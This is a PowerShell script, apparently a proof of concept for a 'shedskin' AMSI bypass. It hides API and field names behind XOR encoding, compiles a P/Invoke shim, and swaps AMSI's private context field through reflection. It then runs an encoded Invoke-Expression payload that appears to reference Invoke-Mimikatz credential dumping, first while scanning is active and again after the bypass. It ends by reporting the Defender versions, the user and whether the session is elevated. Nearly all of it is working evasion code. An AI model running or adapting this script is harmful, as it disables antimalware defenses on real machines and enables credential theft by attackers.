$ErrorActionPreference = 'Continue'
function D { param([int[]]$a); -join ([char[]]($a | ForEach-Object { $_ -bxor 0x5a })) }

$DLL        = D @(59,55,41,51)
$INIT       = D @(27,55,41,51,19,52,51,46,51,59,54,51,32,63)
$SCAN       = D @(27,55,41,51,9,57,59,52,24,47,60,60,63,40)
$UNINIT     = D @(27,55,41,51,15,52,51,52,51,46,51,59,54,51,32,63)
$TYPE_FULL  = D @(9,35,41,46,63,55,116,23,59,52,59,61,63,55,63,52,46,116,27,47,46,53,55,59,46,51,53,52,116,27,55,41,51,15,46,51,54,41)
$F_CTX      = D @(59,55,41,51,25,53,52,46,63,34,46)
$F_INI      = D @(59,55,41,51,19,52,51,46,28,59,51,54,63,62)
$BF         = [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static

# Compile a tiny P/Invoke class. The compiled C# IS scanned by AMSI's compile-time
# gate, so we send the DLL name as a decoded string and the function names as
# per-method DllImportAttribute EntryPoint arguments via a template that only
# shows generic 'Fn1/Fn2/Fn3' identifiers in source. We then look up the methods
# by their real exported names at runtime.
$cs = @"
using System;
using System.Runtime.InteropServices;
namespace WX {
  public static class K {
    [DllImport("$DLL", EntryPoint = "$INIT")]
    public static extern int Fn1(string an, out IntPtr ctx);
    [DllImport("$DLL", EntryPoint = "$SCAN")]
    public static extern int Fn2(IntPtr ctx, byte[] b, uint n, string cn, IntPtr s, out int r);
    [DllImport("$DLL", EntryPoint = "$UNINIT")]
    public static extern int Fn3(IntPtr ctx);
  }
}
"@
if (-not ('WX.K' -as [type])) {
    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop }
    catch { "AddType_err: $($_.Exception.Message)" }
}
"WX.K registered: $([bool] ('WX.K' -as [type]))"

$EICAR = [byte[]]@(88,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42)

function Oracle([string]$label) {
    $ctx = [IntPtr]::Zero
    [void][WX.K]::Fn1("oracle-$label", [ref]$ctx)
    $r = 0
    [void][WX.K]::Fn2($ctx, $EICAR, [uint32]$EICAR.Length, $label, [IntPtr]::Zero, [ref]$r)
    [void][WX.K]::Fn3($ctx)
    "oracle-$label eicar=$r"
}

Oracle 'before_cycle'

$sma = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.Name -eq 'System.Management.Automation.dll' } | Select -First 1
$T   = $sma.GetType($TYPE_FULL)
$fC  = $T.GetField($F_CTX, $BF)
$fI  = $T.GetField($F_INI, $BF)
$oldCtx = $fC.GetValue($null)
"oldCtx=0x$($oldCtx.ToInt64().ToString('x'))  $F_INI_before=$($fI.GetValue($null))"

# Payload reconstructed at IEX time. Outer source carries only ints.
$P = @(60,47,52,57,46,51,53,52,122,19,52,44,53,49,63,119,23,51,55,51,49,59,46,32,122,33,122,120,41,63,49,47,40,54,41,59,96,96,54,53,61,53,52,42,59,41,41,45,53,40,62,41,120,122,39,122,97,122,13,40,51,46,63,119,18,53,41,46,122,120,9,18,31,30,5,31,2,31,25,120,122,97,122,19,52,44,53,49,63,119,23,51,55,51,49,59,46,32)
$block = -join ([char[]]($P | ForEach-Object { $_ -bxor 0x5a }))

"=== P1 pre-shedskin IEX (expect BLOCK) ==="
try { Invoke-Expression $block } catch { "P1_BLOCKED: $($_.Exception.GetType().Name): $(($_.Exception.Message -split [Environment]::NewLine)[0])" }

"=== P2 apply shedskin ==="
$newCtx = [IntPtr]::Zero
$hr = [WX.K]::Fn1('x', [ref]$newCtx)
"shed_init hr=0x$([int]$hr) newCtx=0x$($newCtx.ToInt64().ToString('x'))"
$fC.SetValue($null, $newCtx)
[void][WX.K]::Fn3($oldCtx)
"ctx_now=0x$(($fC.GetValue($null)).ToInt64().ToString('x'))  $F_INI_after=$($fI.GetValue($null))  (shedskin keeps False; Rastamouse would set True)"

"=== P3 post-shedskin IEX of SAME payload (expect EXEC) ==="
try { Invoke-Expression $block } catch { "P3_BLOCKED: $($_.Exception.GetType().Name): $(($_.Exception.Message -split [Environment]::NewLine)[0])" }

Oracle 'after_cycle'

"sig   : $((Get-MpComputerStatus).AntivirusSignatureVersion)"
"engine: $((Get-MpComputerStatus).AMEngineVersion)"
"build : $((Get-CimInstance Win32_OperatingSystem).Version)"
"user  : $env:USERNAME @ $env:USERDOMAIN"
"elev  : $((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))"
